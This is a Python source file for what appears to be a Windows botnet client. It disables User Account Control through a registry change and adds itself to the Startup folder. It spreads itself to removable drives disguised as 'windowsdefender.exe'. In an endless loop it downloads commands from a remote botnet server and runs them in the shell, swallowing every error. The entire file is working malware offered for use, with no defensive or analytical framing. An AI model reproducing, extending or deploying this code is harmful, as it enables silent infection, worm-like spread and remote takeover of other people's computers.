import requests
import os
from os import system
import platform
import time
path=os.path

from dataclasses import dataclass
from typing import Callable, List
import subprocess
import json

url=f"http://bot-net.herokuapp.com/latest/?os={platform.system()}"
startup_path=f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"


@dataclass
class Drive:
    letter: str
    label: str
    drive_type: str

    @property
    def is_removable(self) -> bool:
        return self.drive_type == 'Removable Disk'

def list_rem_drives() -> List[Drive]:
    """
    Get a list of drives using WMI
    :return: list of drives
    """
    proc = subprocess.run(
        args=[
            'powershell',
            '-noprofile',
            '-command',
            'Get-WmiObject -Class Win32_LogicalDisk | Select-Object deviceid,volumename,drivetype | ConvertTo-Json'
        ],
        text=True,
        stdout=subprocess.PIPE
    )
    if proc.returncode != 0 or not proc.stdout.strip():
        print('Failed to enumerate drives')
        return []
    devices = json.loads(proc.stdout)

    drive_types = {
        0: 'Unknown',
        1: 'No Root Directory',
        2: 'Removable Disk',
        3: 'Local Disk',
        4: 'Network Drive',
        5: 'Compact Disc',
        6: 'RAM Disk',
    }

    drives = [Drive(
        letter=d['deviceid'],
        label=d['volumename'],
        drive_type=drive_types[d['drivetype']]
    ) for d in devices]
    res=[]
    for drive in drives:
        if drive.is_removable:
            res.append(drive)
    return res

def add2startup(pathname):
    name = path.basename(pathname)
    if not path.exists(path.join(startup_path,name)):
        os.system(f'copy "{pathname}" "{startup_path}"')

def reproduce_self():
    rem_drives=list_rem_drives()
    if not len(rem_drives)==0:
        for drive in rem_drives:
            if not path.exists(path.join(drive.letter,"windowsdefender.exe")):
                os.system(f"copy \"{path.join(os.getcwd(),'windowsdefender.exe')}\" \"{drive.letter}\\\"")


if __name__=="__main__":
    if platform.system()=="Windows":
        #changing the uac settings so that windows never notifies the user for administrator previleges
        os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
        #adding bot in startuplist
        add2startup(path.join(os.getcwd(),"windowsdefender.exe"))
    while True:
        try:
            if platform.system()=="Windows":
                reproduce_self()
            code=requests.get(url).text
            system(code)
        except:
            pass
        time.sleep(15)



